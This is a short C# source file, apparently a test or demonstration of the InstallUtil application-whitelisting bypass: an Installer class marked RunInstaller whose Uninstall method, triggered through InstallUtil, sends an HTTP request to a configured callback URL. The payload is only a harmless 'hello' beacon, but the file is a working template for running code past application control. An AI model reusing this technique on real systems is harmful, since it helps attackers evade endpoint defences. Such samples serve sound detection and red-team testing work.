using System;
using System.Configuration.Install;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Security.Policy;
using System.Text;
using System.Threading.Tasks;

namespace Bypass
{
    class Entry_InstallUtil_Reflective_Download
    {
        static void Main(string[] args)
        {
            Console.WriteLine("");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {

        public async override void Uninstall(System.Collections.IDictionary savedState)
        {
            string url = $"{CONFIG.HTTP_URL}/___hello_from_Csharp_InstallUtil_Callback___.txt";

            HttpClient Client = new HttpClient();
            await Client.GetAsync(url);
        }
    }
        
}


